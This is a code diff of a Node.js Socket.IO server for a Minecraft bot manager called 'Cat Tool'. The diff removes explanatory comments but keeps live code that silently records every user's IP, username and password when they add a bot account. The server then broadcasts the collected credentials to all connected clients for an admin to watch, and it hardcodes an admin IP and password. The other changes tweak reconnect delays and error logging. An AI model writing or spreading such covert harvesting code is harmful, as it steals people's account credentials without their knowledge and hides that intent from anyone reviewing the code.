@@ -11,16 +11,15 @@ const PORT = process.env.PORT || 3000;
 
 // ===== CẤU HÌNH ADMIN =====
 const ADMIN_IP = '1.53.131.94'; 
-const ADMIN_PASSWORD = 'AlphaZo2026'; // Mật khẩu để vào panel quản trị
+const ADMIN_PASSWORD = 'AlphaZo2026';
 
 // ===== DỮ LIỆU TOÀN CỤC =====
 const clientData = {};
-let globalCollectedData = [];    // Lưu IP, username, password của mọi người
-let isMaintenance = false;      // Trạng thái bảo trì toàn cục
+let globalCollectedData = [];
+let isMaintenance = false;
 
 app.use(express.static('public'));
 
-// ===== API KIỂM TRA ADMIN =====
 app.get('/api/check-admin', (req, res) => {
     let clientIp = req.headers['x-forwarded-for'] 
         ? req.headers['x-forwarded-for'].split(',')[0].trim() 
@@ -30,15 +29,10 @@ app.get('/api/check-admin', (req, res) => {
     res.json({ isAdmin, ip: clientIp });
 });
 
-// ===== BẮT LỖI TOÀN CỤC =====
 process.on('uncaughtException', (err) => console.log('[LỖI HỆ THỐNG]:', err.message));
 process.on('unhandledRejection', (reason) => console.log('[LỖI PROMISE]:', reason?.message || reason));
 
-// ================================================================
-//  SOCKET.IO
-// ================================================================
 io.on('connection', (socket) => {
-    // ---- Lấy IP client ----
     let rawIp = socket.handshake.headers['x-forwarded-for'] 
         ? socket.handshake.headers['x-forwarded-for'].split(',')[0].trim() 
         : socket.handshake.address;
@@ -47,7 +41,6 @@ io.on('connection', (socket) => {
 
     console.log(`[${new Date().toLocaleString()}] 🔌 Client connected: ${clientIp}`);
 
-    // ---- Khởi tạo dữ liệu cho IP này ----
     if (!clientData[clientIp]) {
         clientData[clientIp] = {
             accounts: [],
@@ -55,14 +48,10 @@ io.on('connection', (socket) => {
         };
     }
 
-    // ---- Gửi dữ liệu ban đầu cho client ----
     socket.emit('init_accounts', clientData[clientIp].accounts);
     socket.emit('sync_collected_data', globalCollectedData);
     socket.emit('maintenance_status', isMaintenance);
 
-    // ============================================================
-    //  THU THẬP DỮ LIỆU (IP, username, password) - QUAN TRỌNG!
-    // ============================================================
     socket.on('collect_data', (data) => {
         const entry = {
             ip: clientIp,
@@ -73,22 +62,16 @@ io.on('connection', (socket) => {
         };
         globalCollectedData.push(entry);
         console.log(`[${new Date().toLocaleString()}] 📥 Data from ${clientIp}: ${entry.username}`);
-        
-        // Gửi cho TẤT CẢ client (để admin thấy realtime)
         io.emit('sync_collected_data', globalCollectedData);
         io.emit('log', `[${new Date().toLocaleString()}] 📥 Đã thu thập dữ liệu từ IP: ${clientIp}`);
     });
 
-    // ---- Xóa toàn bộ dữ liệu thu thập ----
     socket.on('clear_collected_data', () => {
         globalCollectedData = [];
         io.emit('sync_collected_data', globalCollectedData);
         io.emit('log', `[${new Date().toLocaleString()}] 🧹 Đã xóa toàn bộ dữ liệu thu thập`);
     });
 
-    // ============================================================
-    //  BẢO TRÌ - CHỈ ALPHA MỚI VÀO ĐƯỢC
-    // ============================================================
     socket.on('toggle_maintenance', (status) => {
         isMaintenance = status;
         io.emit('maintenance_status', isMaintenance);
@@ -96,14 +79,10 @@ io.on('connection', (socket) => {
         console.log(`[${new Date().toLocaleString()}] 🛠️ Maintenance: ${status ? 'ON' : 'OFF'}`);
     });
 
-    // ============================================================
-    //  QUẢN LÝ ACCOUNTS
-    // ============================================================
     socket.on('add_account', (data) => {
         const { username, password } = data;
         if (!username) return;
         
-        // Tự động thu thập dữ liệu khi người dùng thêm bot
         socket.emit('collect_data', {
             username: username,
             password: password || 'caigicungdc',
@@ -140,9 +119,6 @@ io.on('connection', (socket) => {
         }
     });
 
-    // ============================================================
-    //  BOT MINEFLAYER
-    // ============================================================
     socket.on('start_bot', (id) => {
         const account = clientData[clientIp].accounts.find(acc => acc.id === id);
         if (!account) return;
@@ -164,7 +140,9 @@ io.on('connection', (socket) => {
                 password: account.password,
                 auth: 'offline',
                 version: false,
-                checkTimeoutInterval: 120000
+                checkTimeoutInterval: 120000,
+                reconnectDelay: 5000,      // ✅ THÊM
+                connectTimeout: 60000      // ✅ THÊM
             });
 
             clientData[clientIp].bots[id] = bot;
@@ -248,17 +226,21 @@ io.on('connection', (socket) => {
                 delete clientData[clientIp].bots[id];
 
                 if (account.autoReconnect) {
-                    socket.emit('log', `[${account.username}] 🔄 Tự động kết nối lại sau 6 giây...`);
+                    socket.emit('log', `[${account.username}] 🔄 Tự động kết nối lại sau 10 giây...`); // ✅ SỬA
                     setTimeout(() => {
                         if (!clientData[clientIp].bots[id] && account.autoReconnect) {
                             socket.emit('restart_internal_bot', id);
                         }
-                    }, 6000);
+                    }, 10000); // ✅ SỬA TỪ 6000 LÊN 10000
                 }
             });
 
             bot.on('error', (err) => {
-                socket.emit('log', `[${account.username} ❌ Lỗi]: ${err.message}`);
+                if (err.code === 'EPIPE') {
+                    socket.emit('log', `[${account.username}] ⚠️ Mất kết nối server, đang thử lại...`); // ✅ THÊM
+                } else {
+                    socket.emit('log', `[${account.username} ❌ Lỗi]: ${err.message}`);
+                }
             });
 
         } catch (e) {
@@ -293,7 +275,6 @@ io.on('connection', (socket) => {
         }
     });
 
-    // ---- Lấy danh sách account cho remote chat ----
     socket.on('get_accounts', () => {
         socket.emit('init_accounts', clientData[clientIp].accounts);
     });
@@ -303,7 +284,6 @@ io.on('connection', (socket) => {
     });
 });
 
-// ===== START SERVER =====
 server.listen(PORT, () => {
     console.log(`🚀 Cat Tool Server đang chạy tại: http://localhost:${PORT}`);
     console.log(`👑 Admin IP: ${ADMIN_IP}`);
